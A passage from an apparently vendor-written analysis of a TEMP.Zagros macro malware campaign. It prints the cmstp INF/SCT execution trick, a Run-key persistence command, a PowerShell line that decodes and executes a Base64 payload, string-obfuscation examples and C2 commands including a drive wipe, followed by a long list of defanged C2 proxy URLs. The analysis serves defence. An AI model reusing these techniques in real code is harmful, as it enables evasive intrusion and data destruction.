shows a document purporting to be from the National Assembly of Pakistan.PDFmyURL converts any url to pdf!Figure 5: Document purporting to be from the National Assembly of PakistanA document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6.PDFmyURL converts any url to pdf!Figure 6: Document purporting to be from the Turkish Armed ForcesA document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7.PDFmyURL converts any url to pdf!Figure 7: Document purporting to be from the Institute for Development and Research in Banking TechnologyFigure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan.PDFmyURL converts any url to pdf!Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of TajikistanEach of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server.Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018. The threat group in this recently observed campaign \u2013 TEMP.Zagros \u2013 weaponized their malware using the following techniques.The macro in the Word document drops three files in a hard coded path: C:\\programdata. Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above. The following are the three files:PDFmyURL converts any url to pdf!Defender.sct \u2013 The malicious JavaScript based scriptlet file.Defender.sct \u2013 The malicious JavaScript based scriptlet file. DefenderService.inf \u2013 The INF file that is used to invoke the above scriptlet file. WindowsDefender.ini \u2013 The Base64 encoded and obfuscated PowerShell script.After dropping the three files, the macro will set the following registry key to achieve persistence:\\REGISTRY\\USER\\SID\\Software\\Microsoft\\Windows\\CurrentVersio n\\Run\\\"WindowsDefenderUpdater\" = cmstp.exe /s c:\\programdata\\DefenderService.infUpon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. This is possible because inside the INF file we have the following section:[UnRegisterOCXSection] %11%\\scrobj.dll,NI,c:/programdata/Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9.Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products. FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique.PDFmyURL converts any url to pdf!SCT File AnalysisSCT File AnalysisThe code of the Defender.sct file is an obfuscated JavaScript. The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line:powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get- content C:\\\\ProgramData\\\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script.PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools.Some of the key obfuscation techniques used are:Character Replacement: Several instances of character replacement and stringreversing techniques (Figure 10) make analysis difficult.Figure 10: Character replacement and string reversing techniquesPowerShell Environment Variables: Nowadays, malware authors commonly maskcritical strings such as \u201cIEX\u201d using environment variables. Some of the instances used in this script are:$eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')XOR encoding: The biggest section of the PowerShell script is XOR encoded using asingle byte key, as shown in Figure 11.PDFmyURL converts any url to pdf!Figure 11: PowerShell script is XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script, we can divide it into three sections.Section 1The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:TEMpPAtH = \"C:\\ProgramData\\\" (the path used for storing the temp files) Get_vAlIdIP = url (used to get the public IP address of themachine)FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \"HKLM:\\Software\\\" Hkcu = \"HKCU:\\Software\\\" DrAGon_MidDLe = [array of proxy URLs]Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12.PDFmyURL converts any url to pdf!Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server. The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script.Section 3The third section of the PowerShell script is the biggest section and has a wide variety of functionalities.During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:The English translation for this message is: \u201cCannot connect to website, please wait for dragon\u201d.PDFmyURL converts any url to pdf!dragon\u201d.Other functionalities provided by this section of the PowerShell Script are as follows:Retrieves the following data from the system by leveraging Windows ManagementInstrumentation (WMI) queries and environment variables:IP Address from Network Adapter Configuration Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure 13:Figure 13: Concatenated and formatted data retrieved by PowerShell scriptRegister the victim\u2019s machine to the C2 server by sending the REGISTER commandto the server. In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim\u2019s machine and the C2 server.While sending to the C2 server, the data is formatted as follows:@{SYSINFO = $get.ToString(); ACTION = \"REGISTER\";}Ability to take screenshots.PDFmyURL converts any url to pdf!Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14.Figure 14: System shut down upon discovery of security toolsAbility to receive PowerShell script from the C2 server and execute on the machine.Several techniques are employed for executing the PowerShell code:If command starts with \u201cexcel\u201d, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:If the command starts with \u201coutlook\u201d, then it leverages Outlook.Application and MSHTA to execute the code:If the command starts with \u201crisk\u201d, then execution is performed through DCOM object:PDFmyURL converts any url to pdf!File upload functionality.Ability to disable Microsoft Office Protected View (as shown in Figure 15) by settingthe following keys in the Windows Registry:DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure 15: Disabling Microsoft Office Protected ViewAbility to remotely reboot or shut down or clean the system based on thecommand received from the C2 server, as shown in Figure 16.PDFmyURL converts any url to pdf!Figure 16: Reboot, shut down and clean commandsAbility to sleep for a given number of seconds.The following table summarizes the main C2 commands supported by this PowerShell Script.C2 CommandPurposerebootshutdowncleanscreenshotuploadexceloutlookriskPDFmyURL converts any url to pdf!Reboot the system using shutdown commandShut down the system using shutdown commandWipe the Drives, C:\\, D:\\, E:\\, F:\\Take a screenshot of the SystemEncrypt and upload the information from the systemLeverage Excel.Application COM object for code executionLeverage Outlook.Application COM object for code executionLeverage DCOM object for code executionConclusionThis activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware. By combining multiple layers of obfuscation, they deter the process of reverse engineering and also attempt to evade security products.Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when Projesinde .docTurkeyTurkeyNetwork IndicatorsList of Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy-home-sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com/admin/db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com/wp-includes/db_template.phphxxps://anbinni.ba/wp-admin/db_template.phphxxp://arctistrade[.]de/wp/db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za/oldweb/db_template.phphxxp://chrisdejager-attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxp://agencereferencement.be/wp-admin/db_template.phphxxp://americanlegacies[.]org/webthed_ftw/db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk/category/db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex-frost[.]com/assets/db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za/contents/db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best-digital-slr-cameras[.]com//db_template.phphxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com/wp-admin/db_template.phphxxp://ar-rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp://alexanderbecker[.]net/services/db_template.phphxxp://visionclinic.co.ls/visionclinic/db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxps://www.dopetroleum[.]com//db_template.phphxxp://bios-chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba-africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za/js/db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com/wp-admin/db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info/tpl/db_template.phphxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero-resource-center[.]org/administrator/db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za/wpscripts/db_template.phphxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phpPDFmyURL converts any url to pdf!hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com/font-awesome/fonts/db_template.phphxxps://amooy[.]com/webservice/db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za/catalog/db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com/wp-includes/db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net/host24new/db_template.phphxxp://www.altaica[.]ca/wordpress/db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za/js/db_template.phphxxp://clientcare.co.ls//db_template.phpPDFmyURL converts any url to pdf!hxxp://investaholdings[.]co.za/htc/db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com/store/db_template.phphxxp://findinfo-more[.]com//db_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com/includes/db_template.phphxxp://arbruisseau[.]com/profiles/db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all-reseller[.]com/zzz_backup/db_template.phphxxp://alcatrazmoon[.]com/images/db_template.phphxxp://www.alcalumni[.]com/wp-includes/db_template.phphxxp://aniljoseph[.]com/servermon/db_template.phphxxp://alwake3press[.]com/wp-includes/db_template.phphxxp://www.hfhl[.]org.ls/habitat/db_template.phphxxp://alcafricanos[.]com/slsmonographs/db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phpPDFmyURL converts any url to pdf!hxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org/en/db_template.phphxxps://ancient-wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk/font-awesome/db_template.phphxxp://geetransfers[.]co.za/font-awesome/db_template.phphxxp://carlagrobler[.]co.za/components/db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za/video/db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz/kitzz/db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za/nweb2/db_template.phpPDFmyURL converts any url to pdf!hxxp://chrishanicdc[.]org/wpimages/db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia-equip[.]co[.]uk//db_template.phphxxp://always-beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com/wp-admin/db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew-snyder[.]net/bootstrap/db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta-armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za/images/db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor-clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com/wp-includes/db_template.phpPDFmyURL converts any url to pdf!hxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://angel-seeds[.]com.ua/catalog/db_template.phphxxp://alissanicolai[.]com/assets/db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za/php/db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za/trendy1/db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com/wp-admin/db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com/tmp/db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com/admin/db_template.phphxxps://allusdoctors[.]com/themes/db_template.phpPDFmyURL converts any url to pdf!hxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.phphxxp://itengineering[.]co.za/gatewaydiamond/db_template.phphxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net/wp-includes/db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc-sec[.]net//db_template.phphxxp://ldams[.]org.ls/supplies/db_template.phphxxp://menaboracks[.]co.za/tmp/db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za/templates/db_template.phphxxp://fccorp[.]co.za/php/db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws-gov[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxp://alwahahweb[.]com//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com/widgetstyles/db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com/wp-includes/db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com/admin/db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com/wpimages/db_template.phphxxp://glgroup[.]co.za/images/db_template.phphxxp://hisandherskennels[.]co.za/php/db_template.phphxxp://alemaohost[.]com/lotosorg[.]com/db_template.phphxxp://isibaniedu[.]co.za/admin/db_template.phphxxp://dianakleyn[.]co.za/layouts/db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za/js/db_template.phphxxp://highschoolsuperstar[.]co.za/files/db_template.phphxxp://www.ambientproperty[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za/font-awesome/db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za/css/db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com/wp-includes/db_template.phphxxp://allisonplumbing[.]com/wp-includes/db_template.phphxxp://eastrandmotorlab[.]co.za/fleet/db_template.phphxxp://angelsongroup[.]com/wp-includes/db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb-racing[.]co.za/htdocs/db_template.phphxxp://anotherpartofme[.]com/wp-includes/db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxp://www.rejoicetheatre[.]com//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc-u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk/shopping/db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com/wp-includes/db_template.phphxxp://colenesphotography[.]co.za/modules/db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com/thumbs/db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es/storefront/db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za/js/db_template.phphxxp://promechtransport[.]co.za/scripts/db_template.phpPDFmyURL converts any url to pdf!hxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com/gallonature/db_template.phphxxp://oftheearthphotography[.]com/www/db_template.phphxxp://h-dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com/downloads/db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com/email_template/db_template.phphxxp://funisalodge[.]co.za/data1/db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs-consult[.]com//db_template.phphxxp://www.animationinisrael[.]org/tmp_images/db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za/photography/db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.phphxxp://almeriahotelja[.]com/dk/db_template.phpPDFmyURL converts any url to pdf!hxxp://al3abflash[.]biz//db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com/assets/db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com/leadership/db_template.phphxxps://ahelicoptermom[.]com/wp-includes/db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com/wp-admin/db_template.phphxxp://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za/test/db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org/wp-admin/db_template.phphxxp://www.alexandrasternin[.]com/illustration/db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za/assets/db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek-intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.phphxxp://alorabrownies[.]com/wp-admin/db_template.phphxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.phphxxp://cazochem[.]co.za/cazochem/db_template.phphxxp://debnoch[.]com/image/db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz/admin/db_template.phpPDFmyURL converts any url to pdf!hxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://insta-art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com/uploads/db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.phphxxp://amruthavana[.]com/blog/db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za/wpimages/db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za/images/db_template.phphxxps://www.apliety[.]co.il/wp-includes/db_template.phphxxp://alchamelup[.]org/htdocs/db_template.phphxxp://benonicoc[.]co.za/resources/db_template.phphxxps://al-mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phpPDFmyURL converts any url to pdf!hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com/wp-includes/db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls/modules/db_template.phphxxp://apironco[.]com/wp-includes/db_template.phphxxp://digital-cameras-south-africa[.]co.za/script/db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl/next/db_template.phphxxp://juniorad[.]co.za/vendor/db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com/allaccess/db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phpPDFmyURL converts any url to pdf!hxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za/less/db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com/wp1/db_template.phphxxp://anet-international-group[.]com/shop/db_template.phphxxp://courtesydriving[.]co.za/js/db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma-law[.]co.za//db_template.phphxxp://amari[.]ro/components/db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com/wp/wp-includes/db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com/dnsarabia[.]com/db_template.phphxxp://airesis.blog/wp-admin/db_template.phphxxp://www.aptibet[.]org//db_template.phpPDFmyURL converts any url to pdf!hxxp://alecattic[.]com/wp-includes/db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za/wpscripts/db_template.phphxxp://www.allwestdental[.]com/wp-includes/db_template.phphxxp://printernet[.]co.za//db_template.phphxxp://genesisbs[.]co.za//db_template.phphxxp://allsporthealthandfitness[.]com//db_template.phphxxp://www.humorcarbons[.]com//db_template.phphxxp://intelligentprotection[.]co.za//db_template.phphxxp://amazethings[.]com//db_template.phphxxp://incoso[.]co.za/images/db_template.phphxxp://www.antoanetapalikarska[.]com//db_template.phphxxps://www.alteaparadise[.]com/wp-includes/db_template.phphxxp://amirmenahem[.]com//db_template.phphxxp://isound[.]co.za//db_template.phphxxp://www.alestilorachel[.]com//db_template.phphxxp://alcfm[.]net/wp-admin/db_template.phphxxp://www.acer-parts[.]co.za//db_template.phphxxp://www.gsmmid[.]com//db_template.phphxxp://skhaleni[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxps://amiici.vision//db_template.phphxxps://andihaas[.]at/wp-includes/db_template.phphxxp://www.albertaprimebeef[.]com//db_template.phphxxps://www.appster[.]it/wp-includes/db_template.phphxxp://amofoundation[.]org/wp-includes/db_template.phphxxp://iqra[.]co.za/pub/db_template.phphxxp://thecompasssolutions[.]co.za//db_template.phphxxp://archwaycarpetscrm[.]co[.]uk//db_template.phphxxp://iggleconsulting[.]com//db_template.phphxxps://angel-blanco[.]net/wp-includes/db_template.phphxxps://anotherdayinparadise[.]ca//db_template.phphxxp://www.bitp[.]co.za//db_template.phphxxp://cupboardcure[.]co.za/vendor/db_template.phphxxp://all2wedding[.]com/wp-includes/db_template.phphxxp://allianz[.]com.pe/wp-admin/db_template.phphxxp://amiehepperlin[.]com//db_template.phphxxps://www.amighini[.]it/webservice/db_template.phphxxp://broken-arrow[.]co.za//db_template.phphxxp://www.ihlosiqs-pm[.]co.za//db_template.phphxxp://alisimple[.]si/wp-includes/db_template.phphxxp://allthat[.]social//db_template.phpPDFmyURL converts any url to pdf!hxxp://allthat[.]social//db_template.phphxxp://www.amphibiblechurch[.]com//db_template.phphxxp://bestencouragementwords[.]com//db_template.phphxxp://alayhamtechnologies[.]com//db_template.phphxxps://alaskanharvestseafood[.]com/backup/db_template.phphxxps://www.air-mag[.]ro//db_template.phphxxp://get-paid-for-online-survey[.]com//db_template.phphxxp://www.antc[.]ch/wp-includes/db_template.phphxxp://firstchoiceproperties[.]co.za//db_template.phphxxp://habibtextiles[.]pk//db_template.phphxxp://fsproperties[.]co.za/engine1/db_template.phphxxp://diegemmerkat[.]co.za//db_template.phphxxp://molepetravel.co.ls//db_template.phphxxp://mmetl[.]co.za//db_template.phphxxp://altrablog[.]com//db_template.phphxxp://abrahamseed[.]co.za//db_template.phphxxp://www.amerindgen[.]com/author/admin1/db_template.phphxxp://altcoinaddict[.]com//db_template.phphxxp://iiee.edu[.]pk//db_template.phphxxp://cmhts[.]co.za/resources/db_template.phphxxp://domesticguardians[.]co.za/Banner/db_template.phpPDFmyURL converts any url to pdf!hxxps://amishcountryfurnishings[.]com//db_template.phphxxps://allday[.]gr//db_template.phphxxp://www.alinn-u-yin[.]com//db_template.phphxxps://www.allin-chain[.]com//db_template.phphxxps://www.anatapackaging[.]com/vendors/db_template.phphxxp://alexcelts[.]com/wp/db_template.phphxxp://www.allstylus[.]com.br//db_template.phphxxp://www.algom-law[.]com//db_template.phphxxp://ambiances-toiles[.]fr//db_template.phpAppendixSecurity Tools Checked on the 